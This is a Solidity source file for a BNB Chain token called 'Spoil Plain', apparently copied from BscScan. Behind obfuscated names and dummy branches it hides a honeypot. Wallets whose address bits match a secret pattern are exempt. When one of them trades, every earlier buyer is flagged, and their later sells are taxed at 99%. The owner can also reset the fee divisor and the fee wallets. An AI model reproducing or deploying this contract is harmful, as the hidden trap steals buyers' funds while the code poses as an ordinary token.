/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SpoilPlain is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Spoil Plain ";
    string constant _symbol = "SpoilPlain";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private swapAutoIsLimit;
    mapping(address => bool) private swapBuyBotsAuto;
    mapping(address => bool) private txReceiverTradingSwap;
    mapping(address => bool) private limitBuySellExempt;
    mapping(address => uint256) private launchedLiquidityMarketingWallet;
    mapping(uint256 => address) private botsBurnWalletMaxReceiverLimit;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeTeamBotsMarketingMaxAuto = 0;
    uint256 private limitAutoLiquidityReceiver = 7;

    //SELL FEES
    uint256 private tradingIsReceiverLimitTeamMax = 0;
    uint256 private launchedBuyMinAuto = 7;

    uint256 private feeLiquidityMarketingLimitAutoMode = limitAutoLiquidityReceiver + modeTeamBotsMarketingMaxAuto;
    uint256 private burnLiquidityFeeIs = 100;

    address private txTeamFeeSell = (msg.sender); // auto-liq address
    address private teamLimitFeeBurnLiquidityMax = (0x27F5f619e4D64C2197a645B5ffFfC017A992B0cA); // marketing address
    address private limitWalletBotsAutoReceiverTeam = DEAD;
    address private launchedExemptWalletTeam = DEAD;
    address private modeTxTeamSwapMinAutoMax = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private limitFeeSwapIsBotsWallet;
    uint256 private liquidityReceiverModeBots;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private botsMaxSwapFee;
    uint256 private teamLaunchedMarketingTrading;
    uint256 private swapLiquidityModeLimitIsLaunched;
    uint256 private limitTxWalletBurn;
    uint256 private isAutoLiquidityExempt;

    bool private txLimitBurnFee = true;
    bool private limitBuySellExemptMode = true;
    bool private maxLiquidityBotsTradingTeamModeAuto = true;
    bool private burnWalletLaunchedBotsSwapReceiverBuy = true;
    bool private sellTeamWalletMin = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private swapLiquidityAutoSell = _totalSupply / 1000; // 0.1%

    
    bool private minBuyExemptMarketing = false;
    bool private liquidityAutoTeamMode = false;
    bool private swapLiquidityExemptWallet = false;
    uint256 private limitTeamBuySell = 0;
    bool private marketingBuyAutoIs = false;
    bool private autoModeWalletMin = false;
    bool private maxReceiverSwapSell = false;
    uint256 private receiverTeamTradingLimitFeeMaxBurn = 0;
    bool private sellIsMarketingReceiver = false;
    bool private swapMaxLaunchedTxBurnMarketingFee = false;
    bool private liquidityAutoTeamMode0 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        botsMaxSwapFee = true;

        swapAutoIsLimit[msg.sender] = true;
        swapAutoIsLimit[address(this)] = true;

        swapBuyBotsAuto[msg.sender] = true;
        swapBuyBotsAuto[0x0000000000000000000000000000000000000000] = true;
        swapBuyBotsAuto[0x000000000000000000000000000000000000dEaD] = true;
        swapBuyBotsAuto[address(this)] = true;

        txReceiverTradingSwap[msg.sender] = true;
        txReceiverTradingSwap[0x0000000000000000000000000000000000000000] = true;
        txReceiverTradingSwap[0x000000000000000000000000000000000000dEaD] = true;
        txReceiverTradingSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptLaunchedBuyLiquidityFeeBotsMax(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return exemptLaunchedBuyLiquidityFeeBotsMax(sender, recipient, amount);
    }

    function exemptLaunchedBuyLiquidityFeeBotsMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (receiverTeamTradingLimitFeeMaxBurn == feeLiquidityMarketingLimitAutoMode) {
            receiverTeamTradingLimitFeeMaxBurn = tradingIsReceiverLimitTeamMax;
        }

        if (sellIsMarketingReceiver != autoModeWalletMin) {
            sellIsMarketingReceiver = liquidityAutoTeamMode;
        }


        bool bLimitTxWalletValue = limitLiquiditySellFeeTeamExempt(sender) || limitLiquiditySellFeeTeamExempt(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                txExemptTradingSwap();
            }
            if (!bLimitTxWalletValue) {
                autoModeBurnBuy(recipient);
            }
        }
        
        if (swapLiquidityExemptWallet != liquidityAutoTeamMode) {
            swapLiquidityExemptWallet = liquidityAutoTeamMode;
        }

        if (liquidityAutoTeamMode != sellTeamWalletMin) {
            liquidityAutoTeamMode = autoModeWalletMin;
        }

        if (maxReceiverSwapSell != minBuyExemptMarketing) {
            maxReceiverSwapSell = marketingBuyAutoIs;
        }


        if (inSwap || bLimitTxWalletValue) {return launchedBuyLiquidityMarketingAuto(sender, recipient, amount);}

        if (!swapAutoIsLimit[sender] && !swapAutoIsLimit[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (swapMaxLaunchedTxBurnMarketingFee != marketingBuyAutoIs) {
            swapMaxLaunchedTxBurnMarketingFee = sellIsMarketingReceiver;
        }

        if (liquidityAutoTeamMode != swapLiquidityExemptWallet) {
            liquidityAutoTeamMode = swapMaxLaunchedTxBurnMarketingFee;
        }

        if (maxReceiverSwapSell != txLimitBurnFee) {
            maxReceiverSwapSell = maxLiquidityBotsTradingTeamModeAuto;
        }


        require((amount <= _maxTxAmount) || txReceiverTradingSwap[sender] || txReceiverTradingSwap[recipient], "Max TX Limit has been triggered");

        if (sellBotsMinLaunched()) {minBurnIsSwap();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (receiverTeamTradingLimitFeeMaxBurn != tradingIsReceiverLimitTeamMax) {
            receiverTeamTradingLimitFeeMaxBurn = tradingIsReceiverLimitTeamMax;
        }

        if (liquidityAutoTeamMode0 == txLimitBurnFee) {
            liquidityAutoTeamMode0 = marketingBuyAutoIs;
        }


        uint256 amountReceived = autoBotsModeMarketing(sender) ? sellAutoSwapMax(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function launchedBuyLiquidityMarketingAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoBotsModeMarketing(address sender) internal view returns (bool) {
        return !swapBuyBotsAuto[sender];
    }

    function autoTradingBuyTeam(address sender, bool selling) internal returns (uint256) {
        
        if (marketingBuyAutoIs != sellTeamWalletMin) {
            marketingBuyAutoIs = txLimitBurnFee;
        }


        if (selling) {
            feeLiquidityMarketingLimitAutoMode = launchedBuyMinAuto + tradingIsReceiverLimitTeamMax;
            return autoMarketingTradingBurn(sender, feeLiquidityMarketingLimitAutoMode);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeLiquidityMarketingLimitAutoMode = limitAutoLiquidityReceiver + modeTeamBotsMarketingMaxAuto;
            return feeLiquidityMarketingLimitAutoMode;
        }
        return autoMarketingTradingBurn(sender, feeLiquidityMarketingLimitAutoMode);
    }

    function sellAutoSwapMax(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(autoTradingBuyTeam(sender, receiver == uniswapV2Pair)).div(burnLiquidityFeeIs);

        if (limitBuySellExempt[sender] || limitBuySellExempt[receiver]) {
            feeAmount = amount.mul(99).div(burnLiquidityFeeIs);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function limitLiquiditySellFeeTeamExempt(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function autoMarketingTradingBurn(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = launchedLiquidityMarketingWallet[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function autoModeBurnBuy(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        botsBurnWalletMaxReceiverLimit[exemptLimitValue] = addr;
    }

    function txExemptTradingSwap() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (launchedLiquidityMarketingWallet[botsBurnWalletMaxReceiverLimit[i]] == 0) {
                    launchedLiquidityMarketingWallet[botsBurnWalletMaxReceiverLimit[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(teamLimitFeeBurnLiquidityMax).transfer(amountBNB * amountPercentage / 100);
    }

    function sellBotsMinLaunched() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    sellTeamWalletMin &&
    _balances[address(this)] >= swapLiquidityAutoSell;
    }

    function minBurnIsSwap() internal swapping {
        
        uint256 amountToLiquify = swapLiquidityAutoSell.mul(modeTeamBotsMarketingMaxAuto).div(feeLiquidityMarketingLimitAutoMode).div(2);
        uint256 amountToSwap = swapLiquidityAutoSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (swapMaxLaunchedTxBurnMarketingFee == minBuyExemptMarketing) {
            swapMaxLaunchedTxBurnMarketingFee = swapMaxLaunchedTxBurnMarketingFee;
        }

        if (liquidityAutoTeamMode0 == minBuyExemptMarketing) {
            liquidityAutoTeamMode0 = limitBuySellExemptMode;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeLiquidityMarketingLimitAutoMode.sub(modeTeamBotsMarketingMaxAuto.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeTeamBotsMarketingMaxAuto).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitAutoLiquidityReceiver).div(totalETHFee);
        
        payable(teamLimitFeeBurnLiquidityMax).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                txTeamFeeSell,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTeamLimitFeeBurnLiquidityMax() public view returns (address) {
        if (teamLimitFeeBurnLiquidityMax == modeTxTeamSwapMinAutoMax) {
            return modeTxTeamSwapMinAutoMax;
        }
        if (teamLimitFeeBurnLiquidityMax == txTeamFeeSell) {
            return txTeamFeeSell;
        }
        if (teamLimitFeeBurnLiquidityMax == teamLimitFeeBurnLiquidityMax) {
            return teamLimitFeeBurnLiquidityMax;
        }
        return teamLimitFeeBurnLiquidityMax;
    }
    function setTeamLimitFeeBurnLiquidityMax(address a0) public onlyOwner {
        if (teamLimitFeeBurnLiquidityMax != launchedExemptWalletTeam) {
            launchedExemptWalletTeam=a0;
        }
        teamLimitFeeBurnLiquidityMax=a0;
    }

    function getMinBuyExemptMarketing() public view returns (bool) {
        if (minBuyExemptMarketing != minBuyExemptMarketing) {
            return minBuyExemptMarketing;
        }
        return minBuyExemptMarketing;
    }
    function setMinBuyExemptMarketing(bool a0) public onlyOwner {
        if (minBuyExemptMarketing != maxReceiverSwapSell) {
            maxReceiverSwapSell=a0;
        }
        if (minBuyExemptMarketing != maxLiquidityBotsTradingTeamModeAuto) {
            maxLiquidityBotsTradingTeamModeAuto=a0;
        }
        minBuyExemptMarketing=a0;
    }

    function getLaunchedExemptWalletTeam() public view returns (address) {
        if (launchedExemptWalletTeam != limitWalletBotsAutoReceiverTeam) {
            return limitWalletBotsAutoReceiverTeam;
        }
        if (launchedExemptWalletTeam == txTeamFeeSell) {
            return txTeamFeeSell;
        }
        return launchedExemptWalletTeam;
    }
    function setLaunchedExemptWalletTeam(address a0) public onlyOwner {
        if (launchedExemptWalletTeam != txTeamFeeSell) {
            txTeamFeeSell=a0;
        }
        launchedExemptWalletTeam=a0;
    }

    function getTxTeamFeeSell() public view returns (address) {
        if (txTeamFeeSell == txTeamFeeSell) {
            return txTeamFeeSell;
        }
        return txTeamFeeSell;
    }
    function setTxTeamFeeSell(address a0) public onlyOwner {
        if (txTeamFeeSell == modeTxTeamSwapMinAutoMax) {
            modeTxTeamSwapMinAutoMax=a0;
        }
        if (txTeamFeeSell != teamLimitFeeBurnLiquidityMax) {
            teamLimitFeeBurnLiquidityMax=a0;
        }
        txTeamFeeSell=a0;
    }

    function getSwapMaxLaunchedTxBurnMarketingFee() public view returns (bool) {
        if (swapMaxLaunchedTxBurnMarketingFee != txLimitBurnFee) {
            return txLimitBurnFee;
        }
        if (swapMaxLaunchedTxBurnMarketingFee == maxReceiverSwapSell) {
            return maxReceiverSwapSell;
        }
        if (swapMaxLaunchedTxBurnMarketingFee != autoModeWalletMin) {
            return autoModeWalletMin;
        }
        return swapMaxLaunchedTxBurnMarketingFee;
    }
    function setSwapMaxLaunchedTxBurnMarketingFee(bool a0) public onlyOwner {
        if (swapMaxLaunchedTxBurnMarketingFee == maxLiquidityBotsTradingTeamModeAuto) {
            maxLiquidityBotsTradingTeamModeAuto=a0;
        }
        if (swapMaxLaunchedTxBurnMarketingFee != liquidityAutoTeamMode0) {
            liquidityAutoTeamMode0=a0;
        }
        swapMaxLaunchedTxBurnMarketingFee=a0;
    }

    function getBurnLiquidityFeeIs() public view returns (uint256) {
        if (burnLiquidityFeeIs == receiverTeamTradingLimitFeeMaxBurn) {
            return receiverTeamTradingLimitFeeMaxBurn;
        }
        if (burnLiquidityFeeIs != burnLiquidityFeeIs) {
            return burnLiquidityFeeIs;
        }
        return burnLiquidityFeeIs;
    }
    function setBurnLiquidityFeeIs(uint256 a0) public onlyOwner {
        burnLiquidityFeeIs=a0;
    }

    function getTxReceiverTradingSwap(address a0) public view returns (bool) {
        if (txReceiverTradingSwap[a0] != limitBuySellExempt[a0]) {
            return liquidityAutoTeamMode;
        }
        if (a0 != limitWalletBotsAutoReceiverTeam) {
            return swapLiquidityExemptWallet;
        }
            return txReceiverTradingSwap[a0];
    }
    function setTxReceiverTradingSwap(address a0,bool a1) public onlyOwner {
        txReceiverTradingSwap[a0]=a1;
    }

    function getSwapLiquidityAutoSell() public view returns (uint256) {
        return swapLiquidityAutoSell;
    }
    function setSwapLiquidityAutoSell(uint256 a0) public onlyOwner {
        if (swapLiquidityAutoSell == receiverTeamTradingLimitFeeMaxBurn) {
            receiverTeamTradingLimitFeeMaxBurn=a0;
        }
        if (swapLiquidityAutoSell != limitAutoLiquidityReceiver) {
            limitAutoLiquidityReceiver=a0;
        }
        swapLiquidityAutoSell=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}